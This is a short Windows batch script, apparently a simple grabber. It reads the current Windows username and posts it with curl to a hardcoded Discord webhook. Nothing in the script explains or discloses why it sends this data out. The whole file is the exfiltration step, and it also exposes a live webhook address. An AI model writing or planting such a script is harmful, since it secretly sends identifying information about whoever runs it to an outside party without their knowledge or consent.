@echo off
:: Set the webhook URL
set "webhook=https://discord.com/api/webhooks/1358731296016306186/1OlY9vkgy8hYRtn9HDxGt96rCeL3dXjfjLjzsZk-GlDJHJ2idGwQre-QyiFFMmGUHmZG"

:: Get the Windows username
set "message=Username: %USERNAME%"

:: Send the username to the webhook
curl -X POST -H "Content-Type: application/json" --data "{\"content\": \"%message%\"}" %webhook%

:: Optional pause to see result before closing

